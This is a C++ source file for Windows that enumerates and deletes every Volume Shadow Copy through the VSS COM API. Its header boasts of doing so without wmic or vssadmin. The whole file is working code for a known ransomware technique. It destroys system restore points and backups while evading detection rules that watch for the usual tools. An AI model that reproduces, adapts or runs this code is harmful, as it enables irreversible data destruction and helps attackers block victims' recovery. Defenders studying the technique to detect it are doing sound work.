/*
						ORCA:@ORCx41 10/31/2022

	- Program that delete shadow copies without the need of using wmic / vssadmin
	- Tested on w10 v 10.0.19044 x64 machine

*/


#include <Windows.h>
#include <stdio.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <vsmgmt.h>
#include <atlcomcli.h>

#pragma comment (lib, "VssApi.lib")
#pragma comment (lib, "ResUtils.lib")





#define WSTR_GUID_FMT  L"{%.8x-%.4x-%.4x-%.2x%.2x-%.2x%.2x%.2x%.2x%.2x%.2x}"

#define GUID_PRINTF_ARG( X )                                \
    (X).Data1,                                              \
    (X).Data2,                                              \
    (X).Data3,                                              \
    (X).Data4[0], (X).Data4[1], (X).Data4[2], (X).Data4[3], \
    (X).Data4[4], (X).Data4[5], (X).Data4[6], (X).Data4[7]




int main() {

	CComPtr<IVssBackupComponents>   m_pVssObject;
	CComPtr<IVssEnumObject>			pIEnumSnapshots;
	VSS_OBJECT_PROP					Prop;


	VSS_SNAPSHOT_PROP&				Snap						= Prop.Obj.Snap;
	HRESULT							hr							= S_OK;



	hr = CoInitialize(NULL);
	if (hr != S_OK) {
		printf("[!] CoInitialize Failed : 0x%0.8X \n", hr);
		return -1;
	}
	
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL );
	if (hr != S_OK) {
		printf("[!] CoInitializeSecurity Failed : 0x%0.8X \n", hr);
		return -1;
	}


	hr = CreateVssBackupComponents(&m_pVssObject);
	if (hr == E_ACCESSDENIED){
		printf("[!] Please Run As Admin To Delete Shadow Copies \n");
		return -1;
	}
	if (hr != S_OK) {
		printf("[!] CreateVssBackupComponents Failed : 0x%0.8X \n", hr);
		return -1;
	}


	hr = m_pVssObject->InitializeForBackup();
	if (hr != S_OK) {
		printf("[!] InitializeForBackup Failed : 0x%0.8X \n", hr);
		return -1;
	}

	hr = m_pVssObject->SetContext(VSS_CTX_ALL);
	if (hr != S_OK){
		printf("[!] SetContext Failed : 0x%0.8X \n", hr);
		return -1;
	}


	hr = m_pVssObject->SetBackupState(true, true, VSS_BT_FULL, false);
	if (hr != S_OK) {
		printf("[!] SetBackupState Failed : 0x%0.8X \n", hr);
		return -1;
	}

	hr = m_pVssObject->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pIEnumSnapshots);
	if (hr == VSS_E_OBJECT_NOT_FOUND) {
		printf("[i] There Is No Shadow Copies On This Machine \n");
		return -1;
	}



	while (TRUE){

		ULONG ulFetched;
		hr = pIEnumSnapshots->Next(1, &Prop, &ulFetched);
		if (ulFetched == 0) {
			printf("[+] No More Shadow Copies Were Detected \n");
			break;
		}
		VssFreeSnapshotPropertiesInternal(&Snap);

		LONG lSnapshots = 0;
		VSS_ID idNonDeletedSnapshotID = GUID_NULL;

		wprintf(L"[i] Deleting shadow copy: " WSTR_GUID_FMT L" on %s from the provider: " WSTR_GUID_FMT L"\n",
			GUID_PRINTF_ARG(Snap.m_SnapshotId),
			Snap.m_pwszOriginalVolumeName,
			GUID_PRINTF_ARG(Snap.m_ProviderId));

		hr = m_pVssObject->DeleteSnapshots(Snap.m_SnapshotId, VSS_OBJECT_SNAPSHOT, FALSE, &lSnapshots, &idNonDeletedSnapshotID);
		if (hr != S_OK) {
			printf("[!] DeleteSnapshots Failed: 0x%0.8X \n", hr);
		}
	}


	return 0;
}
